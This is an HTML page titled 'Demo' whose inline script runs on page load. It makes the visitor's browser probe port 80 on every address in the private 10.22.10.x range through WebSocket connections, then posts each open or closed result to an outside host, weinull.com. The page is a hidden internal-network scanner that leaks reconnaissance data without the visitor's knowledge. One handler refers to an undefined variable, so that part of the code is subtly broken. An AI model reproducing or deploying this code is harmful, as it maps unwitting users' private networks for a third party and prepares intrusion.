<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Demo</title>
    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-combined.min.css">
    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-theme.min.css">
    <script type="application/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
</head>
<body>

<script type="application/javascript">
    function port_scan(ip, port) {
        var ws = new WebSocket("ws://" + ip + ":" + port.toString());
        
        ws.onopen = function () {
            $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
        };
        
        ws.onerror = function (msg) {
            if (msg.timeStamp < 1000) {
                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
            } else {
                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - close - timeStamp: " + msg.timeStamp.toString()});
            }
        };
    }
    for (var i = 1; i < 256; i++) {
        port_scan("10.22.10." + i.toString(), 80)
    }
</script>

<script type="application/javascript" src="/static/js/bootstrap.min.js"></script>
</body>
</html>
